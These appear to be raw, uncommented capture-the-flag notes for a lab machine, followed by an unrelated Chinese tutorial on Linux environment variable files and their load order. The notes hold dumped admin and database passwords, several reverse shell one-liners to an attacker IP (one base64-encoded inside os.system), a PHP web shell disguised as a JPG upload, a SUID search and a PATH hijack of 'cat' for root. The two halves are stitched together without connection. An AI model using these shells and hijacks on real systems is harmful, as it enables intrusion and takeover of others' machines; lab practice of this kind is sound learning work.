[+] row[0] = 1:admin:Th3s3usW4sK1ng

/bin/sysinfo


    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';



python3 -c 'import pty; pty.spawn("/bin/bash")'


python3 -c 'import pty; pty.spawn("/bin/bash")'

bash -c 'bash -i > /dev/tcp/10.10.16.16/1337 0>&1'
find / -type f -perm -4000 2>/dev/null  | xargs ls -l

strings /bin/sysinfo


http://10.129.17.115/images/uploads/payload.php.jpg
bash -c 'bash -i > /dev/tcp/10.10.16.16/1337 0>&1'

python3 -c 'import pty;pty.spawn("/bin/bash");'

#!/bin/python3

/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games


os.system("echo YmFzaCAtYyAnYmFzaCAtaSA+L2Rldi90Y3AvMTAuMTAuMTYuMTYvMTMzOCAwPiYxJwo= | base64 -d | bash")

/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
/usr/local/sbin/cat cat
/usr/sbin/cat cat


环境变量配置文件分类
系统级配置文件
文件路径	作用描述
/etc/profile	全局登录配置文件，加载/etc/bash.bashrc和/etc/profile.d/目录下的脚本1
/etc/bash.bashrc	全局bash配置文件，每次bash shell启动时执行
/etc/profile.d/*	存放应用程序启动脚本，由/etc/profile调用
/etc/environment	定义全局环境变量（如PATH），需管理员权限修改2
用户级配置文件
文件路径	作用描述
~/.profile	用户登录时执行一次，可设置用户专属路径和环境变量1
~/.bashrc	每次打开bash shell时执行，可设置路径、命令别名等1
~/.bash_profile	部分系统中替代~/.profile，登录时执行一次2
环境变量加载顺序
Linux环境变量按以下顺序加载

12：
系统级配置：

/etc/environment
/etc/profile
/etc/bash.bashrc
/etc/profile.d/*.sh
用户级配置：

~/.profile 或 ~/.bash_profile
~/.bashrc
示例：加载顺序验证 通过在每个配置文件中添加UU_ORDER变量，可验证实际加载顺序：

bash
复制
# 在/etc/environment中添加
export UU_ORDER="$UU_ORDER:/etc/environment"

# 在~/.profile中添加
export UU_ORDER="$UU_ORDER:~/.profile"
执行echo $UU_ORDER后输出示例：

/etc/environment:/etc/profile:/etc/bash.bashrc:/etc/profile.d/test.sh:~/.profile:~/.bashrc
查看环境变量配置位置的方法
使用grep命令搜索
通过grep命令在配置文件中搜索特定环境变量：

bash
复制
grep -r "PATH=" /etc/profile /etc/bash.bashrc /etc/profile.d/ ~/.profile ~/.bashrc
使用strace跟踪进程
通过strace工具跟踪shell进程启动时读取的文件：

bash
复制
strace -e openat bash -c "echo $PATH" 2>&1 | grep -E "\\.profile|\\.bashrc|/etc/profile"
手动检查配置文件
直接查看常见配置文件内容：

bash
复制
cat /etc/profile /etc/bash.bashrc ~/.profile ~/.bashrc
环境变量配置示例
系统级PATH配置
在/etc/profile中添加MySQL路径：

bash
复制
# /etc/profile 示例片段
if [ -d /usr/local/mysql/bin ]; then
    export PATH="/usr/local/mysql/bin:$PATH"
fi
用户级PATH配置
在~/.bashrc中添加个人工具路径：

bash
复制
# ~/.bashrc 示例片段
if [ -d "$HOME/bin" ]; then
    export PATH="$HOME/bin:$PATH"
fi
注意事项
生效范围：系统级配置对所有用户生效，用户级配置仅对当前用户生效
加载顺序：后加载的文件可能覆盖先加载的值
持久化：直接使用export命令修改仅在当前终端有效，需写入配置文件实现持久化
权限要求：修改系统级配置文件需要管理员权限




